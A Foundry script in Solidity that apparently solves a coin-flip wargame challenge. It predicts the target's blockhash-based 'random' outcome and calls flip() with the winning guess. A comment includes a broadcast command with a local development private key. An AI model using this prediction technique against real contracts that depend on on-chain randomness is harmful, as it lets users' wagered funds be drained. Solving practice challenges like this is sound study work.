// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract Loader {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function play(address target) public {
        console.log("current block.number : %d", block.number);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        ITarget(target).flip(side);
    }
}
contract SolveScript is Script {
    address public target = 0x4374EEcaAD0Dcaa149CfFc160d5a0552B1D092b0;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol:SolveScript --broadcast --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        //Loader loader = new Loader();
        Loader loader = Loader(0x9E7088C23e5C0B2D02cD7886A1BDbC7FE8b71016);
        console.log("loader address : %s", address(loader));
        loader.play(target);
        vm.stopBroadcast();
    }
}
